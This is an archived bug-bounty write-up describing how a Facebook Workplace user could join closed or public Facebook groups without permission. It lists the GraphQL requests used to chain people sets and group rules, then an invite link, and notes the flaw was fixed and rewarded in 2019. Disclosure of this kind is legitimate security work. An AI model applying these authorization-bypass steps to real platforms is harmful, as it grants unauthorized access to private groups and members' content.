---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-05-20_become-member-of-close-public-group.md
original_filename: 2020-05-20_become-member-of-close-public-group.md
title: Become member of close & public group
category: documents
detected_topics:
- access-control
- command-injection
- graphql
- business-logic
tags:
- imported
- documents
- access-control
- command-injection
- graphql
- business-logic
language: en
raw_sha256: c3463b8ec0385a2e01eb0606726dcc925b5d78ad9cf9a40187c682af54f0781c
text_sha256: 16ab97cc52548f5121bd29b1417473f5819026ba63dc6330ed40726b72cd3354
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: false
---

# Become member of close & public group

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-05-20_become-member-of-close-public-group.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, graphql, business-logic
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: False
- Raw SHA256: `c3463b8ec0385a2e01eb0606726dcc925b5d78ad9cf9a40187c682af54f0781c`
- Text SHA256: `16ab97cc52548f5121bd29b1417473f5819026ba63dc6330ed40726b72cd3354`


## Content

---
title: "Become member of close & public group"
page_title: "Become member of close , public group | Medium"
url: "https://medium.com/@yaala/become-member-of-close-public-group-9564c359c050"
authors: ["abdellah yaala (@yaalaab)"]
programs: ["Meta / Facebook"]
bugs: ["Broken authorization", "Logic flaw"]
bounty: "7,500"
publication_date: "2020-05-20"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4571
scraped_via: "browseros"
---

# Become member of close & public group

Become member of close & public group
abdellah yaala
Follow
2 min read
·
May 20, 2020

116

Description
===
this bug allow attacker to add him self as member to closed &public group using workplace platform

Press enter or click to view image in full size

===
1 — go to workplace platform : https://work.facebook.com/work/admin/user_sets/

2 — create people set :

POST /api/graphql/ HTTP/1.1
Host: work.facebook.com

variables={“input”:{“client_mutation_id”:”11",”actor_id”:”actorid”,”name”:”myset-test”,”external_id”:””}}&doc_id=1801011926626947

3- add your work id to the set created:

POST /api/graphql/ HTTP/1.1
Host: work.facebook.com

variables={“input”:{“client_mutation_id”:”12",”actor_id”:”actorid”,”member_id”:”[work_profile_id]”,”scim_company_group_id”:”[set_id_created]”}}&doc_id=1690433404336349

4- add your work profile to normal group (group not in www.facebook.com) :

POST /api/graphql/ HTTP/1.1
Host: work.facebook.com

Get abdellah yaala’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

variables={“input”:{“client_mutation_id”:”14",”actor_id”:”actorid”,”rule_id”:”[set_id_created]”,”groups_ids”:[“normal_group”]}}&doc_id=1798717653514339

* normal_group * :is normal closed or public group in www.facebook.com (not in workplace)

— — — — — — — — — — — — — — — -
at this point work user can get notifications about new post and other notifications

but when visit : https://work-id.facebook.com/groups/[normal_group] they redirect to

https://www.facebook.com/groups/[normal_group] to personal profile (not member in group)

- the solution : try to add personnel user to group from work platform

visit this link:

https://work-id.m.facebook.com/groups/members/search/?group_id=%5Bnormal_group%5D

you see Invite via link:

https://fb.me/g/AAAAAAAAAA

visit link and you can join group as personnel user ( see all members ,create post …)

Timeline

August 22, 2019 — Report Sent
September 4, 2019 — Acknowledged by Facebook
September 10, 2019 — Fixed by Facebook
October 16, 2019 — Bounty awarded by Facebook ($7500)
